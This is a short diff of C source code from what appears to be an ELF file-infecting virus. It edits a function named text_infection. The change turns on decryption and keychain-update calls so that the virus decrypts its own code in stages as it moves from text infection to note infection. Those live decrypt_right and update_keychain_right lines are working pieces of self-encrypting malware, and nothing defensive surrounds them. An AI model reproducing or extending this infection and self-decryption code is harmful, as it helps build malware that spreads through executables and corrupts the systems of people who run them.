@@ -35,11 +35,11 @@ __attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr
 
 void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-
 #if LOGGER
 	MID_LOGGER("text_infection:\t\t");
 #endif
+
+	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
 	if (context == FAILURE)
 		goto label;
@@ -70,8 +70,8 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 
 
 label:
-//	update_keychain_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
-//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+	update_keychain_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
 
 	note_infection(host, keychain, context);
 }
